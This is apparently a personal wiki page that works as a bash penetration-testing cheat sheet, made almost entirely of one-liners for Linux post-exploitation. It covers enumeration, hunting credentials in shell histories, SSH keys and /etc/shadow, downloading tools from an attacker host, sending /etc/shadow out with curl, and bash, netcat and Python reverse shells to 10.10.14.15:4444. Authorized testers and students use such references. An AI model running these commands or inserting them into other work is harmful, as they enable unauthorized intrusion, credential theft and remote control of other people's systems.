---
tags: [shell, reference, tool]
module: core
last_updated: 2026-05-11
source_count: 0
---

# Bash — Penetration Testing Quick Reference

Essential bash commands organized by task. One-liner focus — no prose.

## System Enumeration

```bash
# OS and kernel
uname -a
cat /etc/os-release
cat /proc/version

# Current user and context
id
whoami
hostname
cat /etc/passwd | grep -v nologin | grep -v false

# Logged-in users
who
w
last | head -20

# Sudo rights
sudo -l

# Environment variables (credential leaks common here)
env
printenv
cat /proc/1/environ | tr '\0' '\n'
```

## File System Enumeration

```bash
# Find SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID

# World-writable files and directories
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# Find files modified recently
find / -mmin -60 -type f 2>/dev/null

# Find files owned by root but writable by others
find / -user root -writable 2>/dev/null | grep -v proc

# Search for credentials in files
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /opt/ 2>/dev/null
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Find SSH keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "authorized_keys" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null

# Interesting directories
ls -la /home/
ls -la /tmp/ /var/tmp/ /dev/shm/
ls -la /opt/ /var/www/ /srv/
ls -la /root/ 2>/dev/null
```

## Process and Service Enumeration

```bash
# Running processes
ps aux
ps -ef

# Services (systemd)
systemctl list-units --type=service --state=running

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
find / -name "*.cron" 2>/dev/null

# Running ports / connections
ss -tlnp
ss -ulnp
netstat -tlnp 2>/dev/null
netstat -an 2>/dev/null
```

## Network Information

```bash
# Interfaces and IPs
ip a
ifconfig 2>/dev/null

# Routing table
ip route
route -n 2>/dev/null

# ARP cache (adjacent hosts)
arp -n
ip neigh

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# Active connections
ss -antp
netstat -antp 2>/dev/null

# Firewall rules
iptables -L 2>/dev/null
ufw status 2>/dev/null
```

## User and Credential Discovery

```bash
# Bash history (often contains credentials)
cat ~/.bash_history
find /home -name ".bash_history" 2>/dev/null | xargs cat 2>/dev/null
cat ~/.zsh_history

# SSH config
cat ~/.ssh/config
cat ~/.ssh/known_hosts
cat /etc/ssh/sshd_config | grep -v "^#"

# Sudo version (for CVE lookup)
sudo --version

# /etc/shadow (if readable)
cat /etc/shadow 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null
```

## File Transfer (Victim Machine)

```bash
# Python HTTP server on attacker
python3 -m http.server 8080

# Download on victim
wget http://10.10.14.15:8080/linpeas.sh -O /tmp/linpeas.sh
curl http://10.10.14.15:8080/linpeas.sh -o /tmp/linpeas.sh

# Netcat file transfer
# Attacker: nc -lvnp 4444 < file.txt
nc 10.10.14.15 4444 > received_file

# SCP (if SSH available)
scp user@10.129.14.128:/path/to/file ./local/

# Base64 encode and send via stdout (no binary transfer needed)
base64 /etc/shadow | curl -d @- http://10.10.14.15:8080/
```

## Reverse Shell Stagers

```bash
# Bash
bash -i >& /dev/tcp/10.10.14.15/4444 0>&1

# Netcat (with -e)
nc -e /bin/sh 10.10.14.15 4444

# Netcat (without -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.15 4444 >/tmp/f

# Python
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.15",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'

# Shell upgrade after catching
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

## Listener

```bash
nc -lvnp 4444
```

## Useful One-Liners

```bash
# Find all readable files in /etc
find /etc -readable -type f 2>/dev/null

# Check for Docker socket
ls -la /var/run/docker.sock

# Check for interesting capabilities
cat /proc/self/status | grep CapEff
capsh --decode=<hex_value>

# Check for NFS shares
showmount -e 10.129.14.128

# Quick port check without nmap
for port in 22 80 443 445 3306 3389; do
    (echo >/dev/tcp/10.129.14.128/$port) 2>/dev/null && echo "$port open"
done
```

## Related pages

- [[shell_commands/cmd]]
- [[shell_commands/powershell]]
- [[attack/linux_privilege_escalation]]
- [[attack/linux_privesc_enumeration]]
- [[tools/linpeas]]
- [[tools/pspy]]
